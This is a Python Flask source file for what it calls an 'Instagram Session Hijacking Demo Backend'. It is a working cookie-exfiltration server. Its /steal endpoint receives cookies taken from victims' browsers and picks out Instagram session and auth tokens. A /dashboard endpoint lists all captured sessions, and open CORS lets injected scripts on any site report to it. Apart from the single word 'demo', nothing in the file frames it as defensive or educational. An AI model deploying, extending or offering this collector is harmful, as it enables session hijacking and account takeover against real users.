from flask import Flask, request, jsonify
from flask_cors import CORS
import datetime
import json
import os
import uuid

app = Flask(__name__)
CORS(app)  # Allow requests from any frontend

# Store captured sessions in memory (resets on restart)
captured_sessions = []

@app.route("/")
def home():
    return jsonify({
        "status": "running",
        "message": "Instagram Session Hijacking Demo Backend",
        "total_captures": len(captured_sessions)
    })

@app.route("/steal", methods=["GET", "POST", "OPTIONS"])
def steal():
    """Receive stolen cookies from the victim's browser."""
    
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200
    
    record = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        "origin": request.headers.get("Origin", ""),
    }
    
    # Get cookies from request
    if request.method == "GET":
        record["cookies"] = request.args.get("c", "")
        record["page"] = request.args.get("page", "")
    else:
        data = request.get_json(silent=True) or {}
        record["cookies"] = data.get("cookies", request.form.get("cookies", ""))
        record["page"] = data.get("page", "")
    
    # Parse cookies
    parsed = {}
    if record["cookies"]:
        for pair in record["cookies"].split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                parsed[k.strip()] = v.strip()
    record["parsed"] = parsed
    
    # Detect session cookies
    session_keywords = ["sessionid", "session_id", "session", "token", "auth",
                        "sid", "connect.sid", "PHPSESSID", "JSESSIONID",
                        "user_id", "login", "auth_token", "remember_me",
                        "ds_user_id", "csrftoken", "ig_did"]
    
    found = [k for k in parsed if k.lower() in session_keywords or 
             any(s in k.lower() for s in ["session", "token", "auth"])]
    record["session_keys_found"] = found
    record["has_session"] = len(found) > 0
    
    # Store
    captured_sessions.append(record)
    
    # Print to Render logs
    print(f"\n[!] COOKIES CAPTURED at {record['timestamp']}")
    print(f"[!] IP: {record['ip']}")
    print(f"[!] Session keys found: {found}")
    
    return jsonify({
        "status": "success",
        "session_id": record["id"],
        "has_session": record["has_session"],
        "keys_found": found
    })

@app.route("/dashboard", methods=["GET"])
def dashboard():
    """Return all captured sessions as JSON."""
    return jsonify({
        "total": len(captured_sessions),
        "sessions": captured_sessions
    })

@app.route("/clear", methods=["POST"])
def clear():
    """Clear all captured sessions."""
    captured_sessions.clear()
    return jsonify({"status": "cleared"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)